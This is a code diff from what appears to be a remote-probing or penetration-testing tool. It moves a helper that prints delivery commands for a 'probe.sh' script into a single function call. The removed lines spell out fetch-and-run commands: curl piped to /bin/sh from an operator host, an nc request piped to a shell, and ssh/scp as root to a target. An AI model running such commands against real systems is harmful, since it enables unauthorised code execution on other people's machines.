@@ -152,7 +152,7 @@ from gritlib.operator_network import (
 )
 from gritlib.probe_commands import (
     probe_route_context, probe_script_fn, render_probe_base64_paste,
-    render_probe_command, render_probe_dns_command, render_probe_ftp_command,
+    render_probe_command, render_probe_delivery, render_probe_dns_command, render_probe_ftp_command,
     render_probe_paste, render_probe_tftp_command, probe_workflow_action_records,
 )
 from gritlib.probe_results import (
@@ -7553,47 +7553,7 @@ def run_line_tui(cfg):
 
     def _print_probe_delivery():
         """Print all the ways to get probe.sh running on a target."""
-        wget_cmd = render_probe_command(cfg)
-        # Build curl variant from the same URL
-        script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
-        route = probe_route_context(cfg)
-        route_host = str(route.get("host", "OPERATOR_IP") or "OPERATOR_IP")
-        route_port = int(route.get("port", 22207) or 22207)
-        url = f"http://{route_host}:{route_port}/{script_name}"
-        curl_cmd = f"curl -fsSL {shquote(url)} | /bin/sh"
-        tftp_cmd = render_probe_tftp_command(cfg, host=route_host, port=cfg.get("GRIT_PROBE_TFTP_PORT", 22208))
-        ftp_cmd = render_probe_ftp_command(cfg, host=route_host, port=cfg.get("GRIT_PROBE_FTP_PORT", 22209))
-        dns_cmd = render_probe_dns_command(cfg, host=route_host, port=cfg.get("GRIT_PROBE_DNS_PORT", 22210))
-        nc_cmd = (
-            "printf 'GET /"
-            + script_name.replace("'", "")
-            + " HTTP/1.0\\r\\nHost: "
-            + route_host.replace("'", "")
-            + "\\r\\n\\r\\n' | nc "
-            + shquote(route_host)
-            + " "
-            + shquote(str(route_port))
-            + " | sed '1,/^\\r*$/d' | /bin/sh"
-        )
-
-        print("")
-        print("  Delivery options (pick what the target has):")
-        print(f"    wget:  {wget_cmd}")
-        print(f"    curl:  {curl_cmd}")
-        print(f"    tftp:  {tftp_cmd}")
-        print(f"    ftp:   {ftp_cmd}")
-        print(f"    dns:   {dns_cmd}")
-        print(f"    nc:    {nc_cmd}")
-        print(f"    ssh:   ssh root@target '{wget_cmd}'")
-        print(f"    copy:  scp <(curl -s {shquote(url)}) root@target:/tmp/probe.sh && ssh root@target 'sh /tmp/probe.sh'")
-        print("    paste: probe paste")
-        print("")
-        print("  Current listeners: probe-http, probe-tftp, probe-ftp, probe-dns")
-        print("  DNS note: nslookup usually needs DNS exposed on port 53; dig can use custom ports.")
-        print("  If HTTP is blocked but nc works, use the nc command above against the same listener.")
-        print("  If the target only has a serial/admin shell, use: probe paste")
-        print("")
-        print("  probe results  — after running any of the above")
+        print(render_probe_delivery(cfg))
 
     def start_line_service(service):
         service = str(service or "").strip()
